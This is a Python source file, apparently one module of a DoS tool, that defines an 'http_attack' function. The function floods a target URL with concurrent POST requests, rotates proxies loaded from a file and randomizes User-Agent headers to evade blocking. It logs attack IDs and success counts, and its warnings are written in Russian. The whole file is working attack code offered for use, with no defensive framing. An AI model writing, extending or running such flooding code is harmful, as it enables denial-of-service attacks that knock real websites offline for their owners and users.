import httpx
import asyncio
import random
from fake_useragent import UserAgent
from core.logger import attack_start, attack_summary, attack_warning

ua = UserAgent()

def load_proxies(path="proxies.txt"):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        attack_warning("Файл proxies.txt не найден. Будет использоваться прямое подключение.")
        return []

async def send_post_proxy(client, url, proxy, headers, attack_id):
    try:
        async with httpx.AsyncClient(proxies=proxy, timeout=1.5) as proxied_client:
            response = await proxied_client.post(url, headers=headers, data={"data": "test"})
            return response.status_code
    except Exception as e:
        attack_warning(f"[ID-{attack_id}] Ошибка через прокси {proxy}: {e}")
        return None

async def http_attack(user_id, target_url, num_requests=100, concurrency=50, user_agent=True, use_proxy=True):
    attack_id = random.randint(1000, 9999)
    attack_start(user_id, attack_id, "http", target_url, num_requests, concurrency, agent=user_agent)

    headers = {}
    if user_agent:
        headers["User-Agent"] = ua.random
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    proxies = load_proxies()
    success = 0
    start = asyncio.get_event_loop().time()
    sem = asyncio.Semaphore(concurrency)

    async def worker():
        nonlocal success
        proxy = random.choice(proxies) if use_proxy and proxies else None
        proxy_url = f"http://{proxy}" if proxy else None
        async with sem:
            result = await send_post_proxy(httpx.AsyncClient(), target_url, proxy_url, headers, attack_id)
            if result == 200:
                success += 1

    tasks = [asyncio.create_task(worker()) for _ in range(num_requests)]
    await asyncio.gather(*tasks)

    duration = asyncio.get_event_loop().time() - start
    attack_summary(user_id, attack_id, "http", target_url, success, num_requests, duration)
    return success, num_requests
